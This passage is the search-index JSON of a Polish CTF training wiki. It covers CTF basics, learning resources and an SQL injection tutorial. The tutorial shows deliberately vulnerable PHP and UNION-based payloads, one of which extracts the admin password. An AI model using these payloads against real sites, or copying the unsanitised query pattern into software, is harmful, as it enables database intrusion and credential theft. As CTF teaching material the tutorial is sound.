{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\-\\.]+"},"docs":[{"location":"","text":"Wst\u0119p \u00b6 Zbi\u00f3r wiedzy, narz\u0119dzi, ciekawostek i innych rzeczy przydatnych podczas CTF\u00f3w i nie tylko. Strona ta powsta\u0142a jako polska odpowied\u017a na inny tego typu projekt ctf-wiki utrzymywany w j\u0119zyku chi\u0144skim (uproszczonym) oraz w pewnym stopniu w angielskim. O projekcie \u00b6 Strona ta powstaje w ramach dru\u017cyny CTF PWr Synt@x Err0r b\u0119d\u0105cej cz\u0119\u015bci\u0105 ko\u0142a naukowego White-Hats z Politechniki Wroc\u0142awskiej . Przydatne linki na start \u00b6 ctf-wiki - inna tego typu strona w j\u0119zyku chi\u0144skim i angielskim Gynvael Coldwin - kana\u0142 jednego z najs\u0142ynniejszych polskich CTFowc\u00f3w Rozw\u00f3j projektu \u00b6 Je\u015bli masz pomys\u0142 na to co mo\u017cna doda\u0107, co mo\u017cna zmieni\u0107 na tej stronie: skontaktuj si\u0119 z Arqsz . Mo\u017cliwe drogi kontaktu: e-mail Telegram lub sforkuj projekt, wprowad\u017a zmiany i wygeneruj pull requesta zgodnie z tym poradnikiem","title":"Wst\u0119p"},{"location":"#wstep","text":"Zbi\u00f3r wiedzy, narz\u0119dzi, ciekawostek i innych rzeczy przydatnych podczas CTF\u00f3w i nie tylko. Strona ta powsta\u0142a jako polska odpowied\u017a na inny tego typu projekt ctf-wiki utrzymywany w j\u0119zyku chi\u0144skim (uproszczonym) oraz w pewnym stopniu w angielskim.","title":"Wst\u0119p"},{"location":"#o-projekcie","text":"Strona ta powstaje w ramach dru\u017cyny CTF PWr Synt@x Err0r b\u0119d\u0105cej cz\u0119\u015bci\u0105 ko\u0142a naukowego White-Hats z Politechniki Wroc\u0142awskiej .","title":"O projekcie"},{"location":"#przydatne-linki-na-start","text":"ctf-wiki - inna tego typu strona w j\u0119zyku chi\u0144skim i angielskim Gynvael Coldwin - kana\u0142 jednego z najs\u0142ynniejszych polskich CTFowc\u00f3w","title":"Przydatne linki na start"},{"location":"#rozwoj-projektu","text":"Je\u015bli masz pomys\u0142 na to co mo\u017cna doda\u0107, co mo\u017cna zmieni\u0107 na tej stronie: skontaktuj si\u0119 z Arqsz . Mo\u017cliwe drogi kontaktu: e-mail Telegram lub sforkuj projekt, wprowad\u017a zmiany i wygeneruj pull requesta zgodnie z tym poradnikiem","title":"Rozw\u00f3j projektu"},{"location":"main/about/","text":"O CTFach \u00b6 CTF to zawody z zakresu bezpiecze\u0144stwa komputerowego podczas, kt\u00f3rych przed uczestnikami stawia si\u0119 pewne zadania. Wyr\u00f3\u017cnia si\u0119 turnieje typu: Jeopardy (na tych skupiamy si\u0119 w ramach tego projektu) Attack & Defence Znane s\u0105 tak\u017ce inne, mniej popularne rodzaje takie jak: King of the Hill mieszane Jeopardy CTF \u00b6 Najpopularniejsza forma CTF\u00f3w. Turniej podzielony jest na r\u00f3\u017cnorakie kategorie - nacz\u0119\u015bciej wyst\u0119puj\u0105ce to: web pwn crypto misc re Wyst\u0119puj\u0105 te\u017c inne takie jak OSINT (wyszukiwanie informacji w internecie i nie tylko) czy TRIVIA , ale nie s\u0105 one tak popularne jak te wymienione wcze\u015bniej. Flaga \u00b6 Ka\u017cda z kategorii zawiera inny typ zada\u0144, ale ich cel jest taki sam - znale\u017a\u0107 flag\u0119 . Mo\u017ce ona przybiera\u0107 rozmaite formy, ale najcz\u0119\u015bciej jest to 1 skr\u00f3t turnieju + '{' + ci\u0105g znak\u00f3w + '}' Znaki pomi\u0119dzy {} reprezentowane mog\u0105 by\u0107 przez: losowo dobrany, odpowiednio d\u0142ugi ci\u0105g zdanie zapisane w formacie leet speak zdanie w dowolnym j\u0119zyku, ale zamiast spacji mamy _ co tylko wymy\u015bl\u0105 autorzy zadania Je\u015bli ci\u0105g ten jest zrozumia\u0142ym tekstem to zazwyczaj jego tre\u015b\u0107 zwi\u0105zana jest ze sposobem rozwi\u0105zania zadania. We\u017amy na przyk\u0142ad turniej Break The Syntax CTF 2019 i zadanie z kategorii webowej Asterix Gallery . Skr\u00f3t turnieju to BtS-CTF . Zadanie oparte by\u0142o (w duzym uproszczeniu) na manipulacji nag\u0142\u00f3wkami http odpowiedzi od serwera. Ostateczna forma flagi to 1 BtS-CTF{y0u_f0und_my_h34d3r5_6r347_w0rk} O kategoriach \u00b6 Szczeg\u00f3\u0142owy opis ka\u017cdej z kategorii: web pwn crypto misc re Attack and Defence \u00b6 Ten typ zawod\u00f3w jest zdecydowanie mniej popularny, ale nie znaczy to, \u017ce mniej ciekawy. Taki turniej jest trudniejszy do zorganizowania ze wzgl\u0119du na du\u017ce wymagania infrastrukturalne, dlatego rzadko kiedy spotyka si\u0119 t\u0105 form\u0119 w wersji online. Gracze dostaj\u0105 taki sam zestaw \u015brodowisk i maj\u0105 za zadanie jak najlepiej je zabezpieczy\u0107. Celem jest obrona w\u0142asnej maszyny, ataki na \u015brodowiska innych dru\u017cyn i utrzymanie si\u0119 jak najd\u0142u\u017cej w stawce. Najs\u0142ynniejsze tego typu wydarzenia to: iCTF DEF CON CTF","title":"O CTFach"},{"location":"main/about/#o-ctfach","text":"CTF to zawody z zakresu bezpiecze\u0144stwa komputerowego podczas, kt\u00f3rych przed uczestnikami stawia si\u0119 pewne zadania. Wyr\u00f3\u017cnia si\u0119 turnieje typu: Jeopardy (na tych skupiamy si\u0119 w ramach tego projektu) Attack & Defence Znane s\u0105 tak\u017ce inne, mniej popularne rodzaje takie jak: King of the Hill mieszane","title":"O CTFach"},{"location":"main/about/#jeopardy-ctf","text":"Najpopularniejsza forma CTF\u00f3w. Turniej podzielony jest na r\u00f3\u017cnorakie kategorie - nacz\u0119\u015bciej wyst\u0119puj\u0105ce to: web pwn crypto misc re Wyst\u0119puj\u0105 te\u017c inne takie jak OSINT (wyszukiwanie informacji w internecie i nie tylko) czy TRIVIA , ale nie s\u0105 one tak popularne jak te wymienione wcze\u015bniej.","title":"Jeopardy CTF"},{"location":"main/about/#flaga","text":"Ka\u017cda z kategorii zawiera inny typ zada\u0144, ale ich cel jest taki sam - znale\u017a\u0107 flag\u0119 . Mo\u017ce ona przybiera\u0107 rozmaite formy, ale najcz\u0119\u015bciej jest to 1 skr\u00f3t turnieju + '{' + ci\u0105g znak\u00f3w + '}' Znaki pomi\u0119dzy {} reprezentowane mog\u0105 by\u0107 przez: losowo dobrany, odpowiednio d\u0142ugi ci\u0105g zdanie zapisane w formacie leet speak zdanie w dowolnym j\u0119zyku, ale zamiast spacji mamy _ co tylko wymy\u015bl\u0105 autorzy zadania Je\u015bli ci\u0105g ten jest zrozumia\u0142ym tekstem to zazwyczaj jego tre\u015b\u0107 zwi\u0105zana jest ze sposobem rozwi\u0105zania zadania. We\u017amy na przyk\u0142ad turniej Break The Syntax CTF 2019 i zadanie z kategorii webowej Asterix Gallery . Skr\u00f3t turnieju to BtS-CTF . Zadanie oparte by\u0142o (w duzym uproszczeniu) na manipulacji nag\u0142\u00f3wkami http odpowiedzi od serwera. Ostateczna forma flagi to 1 BtS-CTF{y0u_f0und_my_h34d3r5_6r347_w0rk}","title":"Flaga"},{"location":"main/about/#o-kategoriach","text":"Szczeg\u00f3\u0142owy opis ka\u017cdej z kategorii: web pwn crypto misc re","title":"O kategoriach"},{"location":"main/about/#attack-and-defence","text":"Ten typ zawod\u00f3w jest zdecydowanie mniej popularny, ale nie znaczy to, \u017ce mniej ciekawy. Taki turniej jest trudniejszy do zorganizowania ze wzgl\u0119du na du\u017ce wymagania infrastrukturalne, dlatego rzadko kiedy spotyka si\u0119 t\u0105 form\u0119 w wersji online. Gracze dostaj\u0105 taki sam zestaw \u015brodowisk i maj\u0105 za zadanie jak najlepiej je zabezpieczy\u0107. Celem jest obrona w\u0142asnej maszyny, ataki na \u015brodowiska innych dru\u017cyn i utrzymanie si\u0119 jak najd\u0142u\u017cej w stawce. Najs\u0142ynniejsze tego typu wydarzenia to: iCTF DEF CON CTF","title":"Attack and Defence"},{"location":"main/how_to_start/","text":"Jak zacz\u0105\u0107? \u00b6 Przygod\u0119 z ctfami najlepiej zacz\u0105\u0107 od...ctf\u00f3w w\u0142asnie. W internecie znale\u017a\u0107 mo\u017cna wiele stron oferuj\u0105cych bardzo proste zadania, poradniki i inne pomocne rzeczy idealne na start. Takimi stronami s\u0105 np.: picoCTF - platforma, na kt\u00f3rej znale\u017a\u0107 mo\u017cna rozmaite zadania, od \u0142atwych do trudniejszych. Zadania wst\u0119pne pomagaj\u0105 oswoi\u0107 si\u0119 z podstawowymi narz\u0119dziami i teori\u0105. CTFlearn - strona o podobnych celach co picoCTF HTS (HackThisSite) - pole treningowe dla pocz\u0105tkuj\u0105cych haker\u00f3w (i nie tylko). Znale\u017a\u0107 tu mo\u017cna wiele zada\u0144 o r\u00f3\u017cnych stopniach trudno\u015bci. Niekoniecznie jest to format Jeopardy CTF, ale techniki eksploitacji podatno\u015bci pozostaj\u0105 takie same Hacksplaining - strona z tutorialami wyja\u015bniaj\u0105cymi w przyst\u0119pny spos\u00f3b jak dzia\u0142aj\u0105 (albo wr\u0119cz nie dzia\u0142aj\u0105) podatno\u015bci CTF Field Guid - wst\u0119p do CTF\u00f3w i inne przydatne informacje Inne tego typu miejsca znale\u017a\u0107 mo\u017cna tu . Inni hakuj\u0105 \u00b6 Zawsze ciekaw\u0105 opcj\u0105 jest ogl\u0105danie i analiza tego jak kto\u015b inny atakuje systemy lub rozwi\u0105zuje CTFy. Przyk\u0142ady: kana\u0142 LiveOverflow kana\u0142 Youtube Gynvael'a Coldwin'a kana\u0142 Youtube John'a Hammond'a Rozwi\u0105zania zada\u0144 \u00b6 Po przej\u015bciu pewnych podstawowych zada\u0144 i poradnik\u00f3w warto si\u0105\u015b\u0107 do write-up\u00f3w z oficjalnych zawod\u00f3w aby zobaczy\u0107 jak uczestnicy my\u015bl\u0105 i radz\u0105 sobie z problemami. Znale\u017a\u0107 je mo\u017cna w wielu miejscach, np.: ctftime - writeups github/ctfs repozytorium jednego z najlepszych zespo\u0142\u00f3w na \u015bwiecie - P4 Definicja Write-Up - jest to rozwi\u0105zanie zadania, spos\u00f3b podej\u015bcia stworzony przez uczestnika CTFa lub autora. Do boju! \u00b6 Je\u015bli czujesz si\u0119 na si\u0142ach aby wystartowa\u0107 w prawdziwym ctfie to idealnym miejscem dla ciebie b\u0119dzie strona ctftime . Znale\u017a\u0107 tam mo\u017cna turnieje z ca\u0142ego \u015bwiata, z kt\u00f3rych wyniki s\u0105 potem agregowane przez serwis i z tych punkt\u00f3w tworzone s\u0105 rankingi. Ranking og\u00f3lnopolski za rok 2019 Ranking mi\u0119dzynarodowy za rok 2019","title":"Jak zacz\u0105\u0107?"},{"location":"main/how_to_start/#jak-zaczac","text":"Przygod\u0119 z ctfami najlepiej zacz\u0105\u0107 od...ctf\u00f3w w\u0142asnie. W internecie znale\u017a\u0107 mo\u017cna wiele stron oferuj\u0105cych bardzo proste zadania, poradniki i inne pomocne rzeczy idealne na start. Takimi stronami s\u0105 np.: picoCTF - platforma, na kt\u00f3rej znale\u017a\u0107 mo\u017cna rozmaite zadania, od \u0142atwych do trudniejszych. Zadania wst\u0119pne pomagaj\u0105 oswoi\u0107 si\u0119 z podstawowymi narz\u0119dziami i teori\u0105. CTFlearn - strona o podobnych celach co picoCTF HTS (HackThisSite) - pole treningowe dla pocz\u0105tkuj\u0105cych haker\u00f3w (i nie tylko). Znale\u017a\u0107 tu mo\u017cna wiele zada\u0144 o r\u00f3\u017cnych stopniach trudno\u015bci. Niekoniecznie jest to format Jeopardy CTF, ale techniki eksploitacji podatno\u015bci pozostaj\u0105 takie same Hacksplaining - strona z tutorialami wyja\u015bniaj\u0105cymi w przyst\u0119pny spos\u00f3b jak dzia\u0142aj\u0105 (albo wr\u0119cz nie dzia\u0142aj\u0105) podatno\u015bci CTF Field Guid - wst\u0119p do CTF\u00f3w i inne przydatne informacje Inne tego typu miejsca znale\u017a\u0107 mo\u017cna tu .","title":"Jak zacz\u0105\u0107?"},{"location":"main/how_to_start/#inni-hakuja","text":"Zawsze ciekaw\u0105 opcj\u0105 jest ogl\u0105danie i analiza tego jak kto\u015b inny atakuje systemy lub rozwi\u0105zuje CTFy. Przyk\u0142ady: kana\u0142 LiveOverflow kana\u0142 Youtube Gynvael'a Coldwin'a kana\u0142 Youtube John'a Hammond'a","title":"Inni hakuj\u0105"},{"location":"main/how_to_start/#rozwiazania-zadan","text":"Po przej\u015bciu pewnych podstawowych zada\u0144 i poradnik\u00f3w warto si\u0105\u015b\u0107 do write-up\u00f3w z oficjalnych zawod\u00f3w aby zobaczy\u0107 jak uczestnicy my\u015bl\u0105 i radz\u0105 sobie z problemami. Znale\u017a\u0107 je mo\u017cna w wielu miejscach, np.: ctftime - writeups github/ctfs repozytorium jednego z najlepszych zespo\u0142\u00f3w na \u015bwiecie - P4 Definicja Write-Up - jest to rozwi\u0105zanie zadania, spos\u00f3b podej\u015bcia stworzony przez uczestnika CTFa lub autora.","title":"Rozwi\u0105zania zada\u0144"},{"location":"main/how_to_start/#do-boju","text":"Je\u015bli czujesz si\u0119 na si\u0142ach aby wystartowa\u0107 w prawdziwym ctfie to idealnym miejscem dla ciebie b\u0119dzie strona ctftime . Znale\u017a\u0107 tam mo\u017cna turnieje z ca\u0142ego \u015bwiata, z kt\u00f3rych wyniki s\u0105 potem agregowane przez serwis i z tych punkt\u00f3w tworzone s\u0105 rankingi. Ranking og\u00f3lnopolski za rok 2019 Ranking mi\u0119dzynarodowy za rok 2019","title":"Do boju!"},{"location":"main/what_next/","text":"Co dalej? \u00b6 A co je\u015bli CTF nie wystarczaj\u0105 i szukasz czego\u015b wi\u0119cej? Jeste\u015b na dobrej drodze - w internecie znale\u017a\u0107 mo\u017cna wiele miejsc, w kt\u00f3re mo\u017cesz si\u0119 uda\u0107. S\u0105 to m.in.: HackTheBox - pole testowe dla bardziej zaawansowanych fan\u00f3w hakowania. Strona ta skupia wiele maszyn z podatno\u015bciami wyst\u0119puj\u0105cymi w prawdziwym \u015bwiecie. Zadanie gracza to dosta\u0107 si\u0119 do nich i wykra\u015b\u0107 plik z has\u0142em (zazwyczaj jest to plik root.txt ) Uwaga Przyst\u0105pienie do HTB wymaga posiadania kodu aktywacyjnego - je\u015bli jeszcze go nie masz i nie potrafisz zdoby\u0107 samodzielnie to raczej nie jest to strona dla Ciebie. Ze wzgl\u0119du na wysok\u0105 trudno\u015b\u0107 maszyn, warto spr\u00f3bowa\u0107 dosta\u0107 go bez sugestii z internetu. Hackerone - platforma zrzeszaj\u0105ca r\u00f3\u017cne programy Bug Bounty wielu firm z ca\u0142ego \u015bwiata. Znale\u017a\u0107 tam mo\u017cna zar\u00f3wno miejsce do \u0107wiczenia swoich umiej\u0119tno\u015bci (taki mini CTF) jak i faktyczne BB, w kt\u00f3rych mo\u017cna uczestniczy\u0107. Definicja Bug Bounty - jest to program nagradzania os\u00f3b, kt\u00f3re odkry\u0142y b\u0142\u0119dy, podatno\u015bci i luki w zabezpieczeniach danych system\u00f3w. Bugcrowd - platforma bardzo podobna do Hackerone Ciekawy opis BB znale\u017a\u0107 mo\u017cna tutaj . W Polsce system ten wci\u0105\u017c si\u0119 rozwija ale do grona firm nagradzaj\u0105cych haker\u00f3w do\u0142\u0105czy\u0142o niedawno Allegro i miejmy nadziej\u0119, \u017ce inne organizacje p\u00f3jd\u0105 w ich \u015blady.","title":"Co dalej?"},{"location":"main/what_next/#co-dalej","text":"A co je\u015bli CTF nie wystarczaj\u0105 i szukasz czego\u015b wi\u0119cej? Jeste\u015b na dobrej drodze - w internecie znale\u017a\u0107 mo\u017cna wiele miejsc, w kt\u00f3re mo\u017cesz si\u0119 uda\u0107. S\u0105 to m.in.: HackTheBox - pole testowe dla bardziej zaawansowanych fan\u00f3w hakowania. Strona ta skupia wiele maszyn z podatno\u015bciami wyst\u0119puj\u0105cymi w prawdziwym \u015bwiecie. Zadanie gracza to dosta\u0107 si\u0119 do nich i wykra\u015b\u0107 plik z has\u0142em (zazwyczaj jest to plik root.txt ) Uwaga Przyst\u0105pienie do HTB wymaga posiadania kodu aktywacyjnego - je\u015bli jeszcze go nie masz i nie potrafisz zdoby\u0107 samodzielnie to raczej nie jest to strona dla Ciebie. Ze wzgl\u0119du na wysok\u0105 trudno\u015b\u0107 maszyn, warto spr\u00f3bowa\u0107 dosta\u0107 go bez sugestii z internetu. Hackerone - platforma zrzeszaj\u0105ca r\u00f3\u017cne programy Bug Bounty wielu firm z ca\u0142ego \u015bwiata. Znale\u017a\u0107 tam mo\u017cna zar\u00f3wno miejsce do \u0107wiczenia swoich umiej\u0119tno\u015bci (taki mini CTF) jak i faktyczne BB, w kt\u00f3rych mo\u017cna uczestniczy\u0107. Definicja Bug Bounty - jest to program nagradzania os\u00f3b, kt\u00f3re odkry\u0142y b\u0142\u0119dy, podatno\u015bci i luki w zabezpieczeniach danych system\u00f3w. Bugcrowd - platforma bardzo podobna do Hackerone Ciekawy opis BB znale\u017a\u0107 mo\u017cna tutaj . W Polsce system ten wci\u0105\u017c si\u0119 rozwija ale do grona firm nagradzaj\u0105cych haker\u00f3w do\u0142\u0105czy\u0142o niedawno Allegro i miejmy nadziej\u0119, \u017ce inne organizacje p\u00f3jd\u0105 w ich \u015blady.","title":"Co dalej?"},{"location":"web/about/","text":"Aplikacje webowe \u00b6 Internet w obecnych czasach opiera si\u0119 na aplikacjach webowych. Gdzie tylko nie spojrzymy to na nie trafiamy. W niekt\u00f3rych przypadkach jest to dla firm jedyna droga kontaktu z klientami - dlatego jest ona taka wa\u017cna. Wraz z rozwojem technologii pojawia si\u0119 coraz to wi\u0119cej sposob\u00f3w na obej\u015bcie jej. Hakerzy tworz\u0105 coraz to ciekawsze metody, kt\u00f3rych nie przewidzieli tw\u00f3rcy aplikacji. Co w sytuacji je\u015bli nasz program ma dziury, o kt\u00f3rych nie pomy\u015bleli\u015bmy? Nasza strona mo\u017ce by\u0107 drog\u0105 wej\u015bciow\u0105 do serwer\u00f3w, na kt\u00f3rych mog\u0105 znajdowa\u0107 si\u0119 nie tylko nasze dane. W\u015br\u00f3d najpopularniejszych podatno\u015bci aplikacji webowych znale\u017a\u0107 mo\u017cna m.in.: SQL Injection ( SQLi ) Cross-site scripting ( XSS ) Server-side request forgery ( SSRF ) Remote code execution ( RCE ) Path traversal i inne...","title":"O kategorii"},{"location":"web/about/#aplikacje-webowe","text":"Internet w obecnych czasach opiera si\u0119 na aplikacjach webowych. Gdzie tylko nie spojrzymy to na nie trafiamy. W niekt\u00f3rych przypadkach jest to dla firm jedyna droga kontaktu z klientami - dlatego jest ona taka wa\u017cna. Wraz z rozwojem technologii pojawia si\u0119 coraz to wi\u0119cej sposob\u00f3w na obej\u015bcie jej. Hakerzy tworz\u0105 coraz to ciekawsze metody, kt\u00f3rych nie przewidzieli tw\u00f3rcy aplikacji. Co w sytuacji je\u015bli nasz program ma dziury, o kt\u00f3rych nie pomy\u015bleli\u015bmy? Nasza strona mo\u017ce by\u0107 drog\u0105 wej\u015bciow\u0105 do serwer\u00f3w, na kt\u00f3rych mog\u0105 znajdowa\u0107 si\u0119 nie tylko nasze dane. W\u015br\u00f3d najpopularniejszych podatno\u015bci aplikacji webowych znale\u017a\u0107 mo\u017cna m.in.: SQL Injection ( SQLi ) Cross-site scripting ( XSS ) Server-side request forgery ( SSRF ) Remote code execution ( RCE ) Path traversal i inne...","title":"Aplikacje webowe"},{"location":"web/sqlinjection/","text":"Atak SQL injection \u00b6 Wszyscy znamy strony, kt\u00f3re zawieraj\u0105 w sobie formularze czy przekazuj\u0105 w inny spos\u00f3b wszelakie parametry. A co je\u015bli parametry te nie s\u0105 prawid\u0142owo przetworzone po stronie serwera i bezpo\u015brednio trafiaj\u0105 do zapyta\u0144 SQL? Przyk\u0142ad praktyczny \u00b6 We\u017amy na warsztat przyk\u0142adow\u0105 aplikacj\u0119 wykorzystuj\u0105c\u0105 baz\u0119 danych SQLlite3. Jest to prosta strona z formularzem, do kt\u00f3rego je\u015bli podamy imi\u0119 to zwr\u00f3ci nam czy jest ono \u015bmieszne czy nie. Po wpisaniu imienia, jest ono wysy\u0142ane do serwera php w celu dalszej obr\u00f3bki. Tak wygl\u0105da fragment kodu odpowiadaj\u0105cy za zapytanie do bazy danych: 1 2 3 4 $name = $_GET[\"name\"]; $db = new SQLite3('example.db'); $query = \"SELECT is_funny FROM funny as f, users as u JOIN users ON f.user_name=u.user_name WHERE u.user_name='$name'\"; $result = @$db->query($query); Po wpisaniu admin otrzymujemy wynik not funny . Na pocz\u0105tek nale\u017cy przeprowadzi\u0107 weryfikacj\u0119 czy atak SQLi jest mo\u017cliwy. Mo\u017cna to zrobi\u0107 przez podanie ' zamiast parametru. Informacja ta m\u00f3wi nam o tym, \u017ce jest to strona podatna na atak. Nast\u0119pnym krokiem b\u0119dzie weryfikacja z jakim typem bazy danych mamy do czynienia. Mo\u017cna to zrobi\u0107 przez sprawdzenie wersji oprogramowania - polecenie to r\u00f3\u017cni si\u0119 mi\u0119dzy dialektami Dialekt Polecenie MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() Sqlite3 SELECT sqlite_version() Wykona\u0107 to mo\u017cna przez manipulacj\u0119 poleceniem UNION , kt\u00f3ry \u0142\u0105czy wyniki z dw\u00f3ch lub wi\u0119cej zapyta\u0144 SQL w jedno. W tym przypadku b\u0119dzie to 1 admin ' UNION SELECT sqlite_version (); -- Polecenie to zostanie po stronie serwera zamienione w: 1 2 3 4 SELECT is_funny FROM funny as f , users as u JOIN users ON f . user_name = u . user_name WHERE u . user_name = 'admin' UNION SELECT sqlite_version (); --' Dzi\u0119ki temu wiemy, \u017ce jest to baza Sqlite3. Nast\u0119pnym krokiem b\u0119dzie ekstrakcja nazw tabel i kolumn. Zrobi\u0107 to mo\u017cna poleceniem 1 SELECT sql from sqlite_master ; kt\u00f3re w tym przypadku przybierze form\u0119 1 admin ' UNION SELECT sql from sqlite_master ; -- Jako, \u017ce UNION wymaga takiej samej ilo\u015bci kolumn w wyniku obu zapyta\u0144, dane z bazy b\u0119dzie mo\u017cna wyci\u0105ga\u0107 tylko pojedy\u0144czo. Przyk\u0142adowo has\u0142o u\u017cytkownika admin pozyskamy stosuj\u0105c polecenie 1 admin ' UNION SELECT password from users WHERE user_name = ' admin ' ; -- Przydatne zapytania \u00b6 Komentarze \u00b6 -- # /**/ /*! MYSQL Special SQL */ ( tylko w MySQL ) Instrukcja warunkowa if \u00b6 MySQL \u00b6 IF(warunek, wykonaj_jesli_prawda, wykonaj_je\u015bli_fa\u0142sz) PostgreSQL \u00b6 SELECT CASE WHEN warunek THEN wykonaj_jesli_prawda ELSE wykonaj_je\u015bli_fa\u0142sz END; Oracle \u00b6 BEGIN IF warunek THEN wykonaj_jesli_prawda; ELSE wykonaj_je\u015bli_fa\u0142sz; END IF; END; Liczby szesnastkowe \u00b6 S\u0105 one szczeg\u00f3lnie przydatne w przypadku gdy jakie\u015b znaki s\u0105 zakazane. 56 == 0x38 Znaki i ci\u0105gi znak\u00f3w \u00b6 SELECT CHAR(0x41); - zwr\u00f3ci znak ASCII o warto\u015bci szesnastkowej 0x41 SELECT ASCII('a'); - zwr\u00f3ci warto\u015b\u0107 dziesi\u0119tn\u0105 litery wysuni\u0119tej najbardziej na lewo w ci\u0105gu znak\u00f3w SELECT CONCAT(str1, str2, str3, ...); - konkatencja string\u00f3w ( tylko MySQL ) SELECT 'A' || 'B' || 'C'; - konkatencja string\u00f3w; zwr\u00f3ci ABC Union \u00b6 Unie s\u0105 bardzo przydatne gdy potrzebujemy wyci\u0105gn\u0105\u0107 dane z wielu tabel maj\u0105c do dyspozycji tylko jedno zapytanie. Uwaga Unie wymagaj\u0105 takiej samej ilo\u015bci kolumn w obu zapytaniach, kt\u00f3re \u0142\u0105cz\u0105 Wyobra\u017amy sobie dwie tabele: u\u017cytkownicy id nazwa has\u0142o 1 admin admin12345 2 user pass12345 komputery id user_id model 1 2 Lenovo Yoga 2 1 Dell Inspiron Do dyspozycji mamy tylko zapytanie 1 SELECT nazwa , id FROM u\u017cytkownicy ; Otrzymamy w ten spos\u00f3b jedn\u0105 list\u0119 rekord\u00f3w z nazwami u\u017cytkownik\u00f3w i ich has\u0142ami nazwa has\u0142o admin admin12345 user pass12345 Aby wy\u015bwietli\u0107 dodatkowo zawarto\u015b\u0107 kolumny model z tabeli komputery za pomoc\u0105 unii nale\u017cy wykona\u0107 polecenie 1 SELECT nazwa , id FROM u\u017cytkownicy UNION SELECT model , 1 FROM komputery ; Zauwa\u017cmy, \u017ce wymuszone zosta\u0142y tutaj sta\u0142e warto\u015bci 1 aby ilo\u015b\u0107 kolumn w obu wyra\u017ceniach SELECT po\u0142\u0105czonych uni\u0105 si\u0119 zgadza\u0142a. W ten spos\u00f3b otrzymamy wynik: nazwa has\u0142o admin admin12345 user pass12345 Lenovo Yoga 1 Dell Inspiron 1 Graficznie wygl\u0105da to nast\u0119puj\u0105co Join \u00b6 Join \u0142\u0105czy dane z dw\u00f3ch zapyta\u0144 w jedn\u0105 tabel\u0119. Ka\u017cdy wiersz tabeli wynikowej zawiera elementy z obu zbior\u00f3w. Wykonany zostaje na tabelach tzw. iloczyn kartezja\u0144ski czyli ka\u017cdy element z jednej tabeli ma odwzorowanie w elementach drugiej tabeli. Wyobra\u017amy sobie dwie tabele: u\u017cytkownicy id nazwa has\u0142o 1 admin admin12345 2 user pass12345 komputery id user_id model 1 2 Lenovo Yoga 2 1 Dell Inspiron Za\u0142\u00f3\u017cmy, \u017ce chcemy zobaczy\u0107 komputery u\u017cytkownika admin . Mo\u017cemy to osi\u0105gna\u0107 poleceniem: 1 SELECT * FROM u\u017cytkownicy AS u JOIN komputery AS k ON u . id = k . user_id ; W odpowiedzi otrzymamy: u.id u.nazwa u.has\u0142o k.id k.user_id k.model 1 admin admin12345 2 1 Dell Inspiron Graficznie wygl\u0105da to nast\u0119puj\u0105co Inne \u00b6 Info Wi\u0119cej przyk\u0142ad\u00f3w znale\u017a\u0107 mo\u017cna tutaj lub tutaj","title":"SQLi"},{"location":"web/sqlinjection/#atak-sql-injection","text":"Wszyscy znamy strony, kt\u00f3re zawieraj\u0105 w sobie formularze czy przekazuj\u0105 w inny spos\u00f3b wszelakie parametry. A co je\u015bli parametry te nie s\u0105 prawid\u0142owo przetworzone po stronie serwera i bezpo\u015brednio trafiaj\u0105 do zapyta\u0144 SQL?","title":"Atak SQL injection"},{"location":"web/sqlinjection/#przykad-praktyczny","text":"We\u017amy na warsztat przyk\u0142adow\u0105 aplikacj\u0119 wykorzystuj\u0105c\u0105 baz\u0119 danych SQLlite3. Jest to prosta strona z formularzem, do kt\u00f3rego je\u015bli podamy imi\u0119 to zwr\u00f3ci nam czy jest ono \u015bmieszne czy nie. Po wpisaniu imienia, jest ono wysy\u0142ane do serwera php w celu dalszej obr\u00f3bki. Tak wygl\u0105da fragment kodu odpowiadaj\u0105cy za zapytanie do bazy danych: 1 2 3 4 $name = $_GET[\"name\"]; $db = new SQLite3('example.db'); $query = \"SELECT is_funny FROM funny as f, users as u JOIN users ON f.user_name=u.user_name WHERE u.user_name='$name'\"; $result = @$db->query($query); Po wpisaniu admin otrzymujemy wynik not funny . Na pocz\u0105tek nale\u017cy przeprowadzi\u0107 weryfikacj\u0119 czy atak SQLi jest mo\u017cliwy. Mo\u017cna to zrobi\u0107 przez podanie ' zamiast parametru. Informacja ta m\u00f3wi nam o tym, \u017ce jest to strona podatna na atak. Nast\u0119pnym krokiem b\u0119dzie weryfikacja z jakim typem bazy danych mamy do czynienia. Mo\u017cna to zrobi\u0107 przez sprawdzenie wersji oprogramowania - polecenie to r\u00f3\u017cni si\u0119 mi\u0119dzy dialektami Dialekt Polecenie MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() Sqlite3 SELECT sqlite_version() Wykona\u0107 to mo\u017cna przez manipulacj\u0119 poleceniem UNION , kt\u00f3ry \u0142\u0105czy wyniki z dw\u00f3ch lub wi\u0119cej zapyta\u0144 SQL w jedno. W tym przypadku b\u0119dzie to 1 admin ' UNION SELECT sqlite_version (); -- Polecenie to zostanie po stronie serwera zamienione w: 1 2 3 4 SELECT is_funny FROM funny as f , users as u JOIN users ON f . user_name = u . user_name WHERE u . user_name = 'admin' UNION SELECT sqlite_version (); --' Dzi\u0119ki temu wiemy, \u017ce jest to baza Sqlite3. Nast\u0119pnym krokiem b\u0119dzie ekstrakcja nazw tabel i kolumn. Zrobi\u0107 to mo\u017cna poleceniem 1 SELECT sql from sqlite_master ; kt\u00f3re w tym przypadku przybierze form\u0119 1 admin ' UNION SELECT sql from sqlite_master ; -- Jako, \u017ce UNION wymaga takiej samej ilo\u015bci kolumn w wyniku obu zapyta\u0144, dane z bazy b\u0119dzie mo\u017cna wyci\u0105ga\u0107 tylko pojedy\u0144czo. Przyk\u0142adowo has\u0142o u\u017cytkownika admin pozyskamy stosuj\u0105c polecenie 1 admin ' UNION SELECT password from users WHERE user_name = ' admin ' ; --","title":"Przyk\u0142ad praktyczny"},{"location":"web/sqlinjection/#przydatne-zapytania","text":"","title":"Przydatne zapytania"},{"location":"web/sqlinjection/#komentarze","text":"-- # /**/ /*! MYSQL Special SQL */ ( tylko w MySQL )","title":"Komentarze"},{"location":"web/sqlinjection/#instrukcja-warunkowa-if","text":"","title":"Instrukcja warunkowa if"},{"location":"web/sqlinjection/#mysql","text":"IF(warunek, wykonaj_jesli_prawda, wykonaj_je\u015bli_fa\u0142sz)","title":"MySQL"},{"location":"web/sqlinjection/#postgresql","text":"SELECT CASE WHEN warunek THEN wykonaj_jesli_prawda ELSE 